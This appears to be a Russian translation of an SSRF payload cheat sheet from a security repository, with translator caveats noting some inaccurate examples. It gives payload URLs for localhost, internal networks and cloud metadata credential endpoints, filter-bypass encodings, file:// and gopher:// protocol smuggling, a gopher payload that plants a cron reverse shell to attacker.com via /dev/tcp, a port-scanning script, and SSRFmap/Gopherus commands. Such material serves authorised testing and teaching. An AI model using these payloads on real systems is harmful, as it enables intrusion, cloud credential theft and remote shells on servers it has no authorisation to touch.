<a id="-ssrf---server-side-request-forgery"></a>
# 🌐 SSRF — подделка запросов со стороны сервера

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Server-Side Request Forgery
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

<a id="-what-is-ssrf"></a>
## 🎯 Что такое SSRF

> **Уточнение к оригиналу.** Надпись в ASCII-логотипе означает «подделка запросов со стороны сервера». Оценки последствий зависят от реально доступных данных и действий. По [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html), проверять нужно разбор адреса, DNS и перенаправления: числовые IP, другие схемы и показанные домены не являются универсальными обходами. Статическое соответствие домена IP-адресу само по себе не является DNS rebinding. Метки Class A/B/C ниже — исторические обозначения; HTTP-URL на порту SSH/Redis не превращает запрос в соответствующий протокол.

**SSRF** (Server-Side Request Forgery) позволяет злоумышленнику заставить сервер отправлять запросы по непредусмотренным адресам, в том числе к внутренним сервисам или облачным метаданным.

<a id="impact"></a>
### Последствия
- 🔴 **Доступ к внутренней сети** — исследование внутренних сервисов
- 🔴 **Облачные метаданные** — кража учётных данных AWS/GCP
- 🔴 **Обход межсетевых экранов** — доступ к защищённым ресурсам
- 🔴 **RCE** — в некоторых случаях возможно удалённое выполнение кода

---

<a id="-where-to-look"></a>
## 🔍 Где искать

<a id="common-parameters"></a>
### Распространённые параметры
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

<a id="common-vulnerable-functions"></a>
### Типичные функции, в которых встречается уязвимость
```
- Функции загрузки и проверки URL
- Генераторы PDF
- Обработчики изображений
- Импорт файлов
- Вебхуки (webhooks)
- Интеграции с API
- Сборщики данных с веб-страниц (web scrapers)
- Сервисы создания снимков экрана
```

---

<a id="-basic-payloads"></a>
## 💉 Базовые полезные нагрузки

<a id="localhost"></a>
### Локальный узел (localhost)
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

<a id="internal-networks"></a>
### Внутренние сети
```
# Класс A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Класс B
http://172.16.0.1
http://172.31.255.255

# Класс C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Локальный канал (link-local)
http://169.254.169.254
```

<a id="common-ports"></a>
### Распространённые порты
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Альтернативный HTTP
http://127.0.0.1:9200  # Elasticsearch
```

---

<a id="-cloud-metadata"></a>
## ☁️ Облачные метаданные

> **Уточнение.** Примеры AWS показывают IMDSv1; [IMDSv2 требует токен сеанса](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), а при обязательном IMDSv2 запросы без него отклоняются. Для [GCP нужен Metadata-Flavor: Google](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata), для [Azure — Metadata: true](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service). Упрощённому [Azure token endpoint](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token) ниже недостаёт параметра resource; доступ к токенам зависит от настроенной идентичности. Исходные URL сохранены.

<a id="aws"></a>
### AWS
```
# Метаданные экземпляра (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Отдельные сведения
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

<a id="google-cloud-gcp"></a>
### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Требуется указанный заголовок
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

<a id="azure"></a>
### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Требуется заголовок
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

<a id="digitalocean"></a>
### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Приёмы обхода

<a id="ip-address-formats"></a>
### Форматы IP-адресов
```
# Десятичный формат
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Шестнадцатеричный формат
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Восьмеричный формат
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Смешанный формат
http://127.1
http://127.0.1
http://0
```

<a id="url-encoding"></a>
### URL-кодирование
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Двойное кодирование
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

<a id="dns-rebinding"></a>
### Повторная привязка DNS (DNS rebinding)
```
# Примеры сервисов:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Настройка собственного DNS
your-domain.com → 127.0.0.1
```

<a id="url-parsing-issues"></a>
### Особенности разбора URL
```
# Приём с @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Фрагменты
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Обратная косая черта
http://attacker.com\127.0.0.1
```

<a id="protocol-smuggling"></a>
### Использование других протоколов
```
# Файл
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

<a id="open-redirect-chain"></a>
### Цепочка с открытым перенаправлением
```
# Если на сайте есть открытое перенаправление:
https://target.com/redirect?url=http://169.254.169.254/

# Перенаправление на внутренний адрес
http://target.com/redirect?url=http://127.0.0.1:8080
```

<a id="ipv6-bypass"></a>
### Обход с помощью IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

<a id="header-injection"></a>
### Внедрение заголовков
```
# Внедрение CRLF в URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

<a id="-exploitation"></a>
## 🔥 Эксплуатация

> **Уточнение.** Gopher-примеры сохранены как иллюстрации оригинала: длины и разделители должны соответствовать [RESP](https://redis.io/docs/latest/develop/reference/protocol-spec/); приведённая последовательность Redis этому не гарантированно соответствует. В HTTP-примере Content-Length: 20 не совпадает с длиной показанного тела command=id. Отправка HTTP через Gopher сама по себе не доказывает [request smuggling](https://portswigger.net/web-security/request-smuggling), для которого важна неоднозначная обработка границ запросов. Скрипт с меткой OPEN и получение DNS-запроса — предварительные признаки, а не подтверждение открытого порта, доступа к данным или выполнения кода.

<a id="redis-rce-via-gopher"></a>
### Выполнение кода в Redis через Gopher
```
# Создать полезную нагрузку
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

<a id="http-request-smuggling"></a>
### Контрабанда HTTP-запросов (HTTP Request Smuggling)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

<a id="port-scanning"></a>
### Сканирование портов
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="detection"></a>
### Обнаружение
```
# Проверить SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Проверить ответ
- Получен DNS-запрос?
- Получен HTTP-запрос?
- Отличается ли ответ для внутренних IP-адресов?
```

<a id="impact-levels"></a>
### Уровни последствий

| Цель | Последствия |
|--------|--------|
| Облачные метаданные | Критические — кража учётных данных |
| Внутренние API | Высокие — доступ к данным |
| Внутренние сервисы | Высокие — возможное выполнение кода |
| Сканирование портов | Средние — раскрытие информации |

<a id="common-filters--bypasses"></a>
### Распространённые фильтры и способы обхода

| Фильтр | Обход |
|--------|--------|
| Блокировка `localhost` | Использовать `127.0.0.1`, `0`, `[::1]` |
| Блокировка `127.0.0.1` | Использовать десятичное представление `2130706433` |
| Блокировка частных IP-адресов | Использовать DNS rebinding |
| Только HTTP | Проверить `gopher://`, `file://` |
| Разрешённый домен | Проверить приём с `@` и открытое перенаправление |

---

<a id="-tools"></a>
## 🛠️ Инструменты

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (генератор полезных нагрузок Gopher)
python gopherus.py --exploit redis

# Collaborator/webhook для слепой SSRF
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [SSRF в PortSwigger](https://portswigger.net/web-security/ssrf)
- [Справочник OWASP по предотвращению SSRF](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SSRF в PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Исследуйте SSRF!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
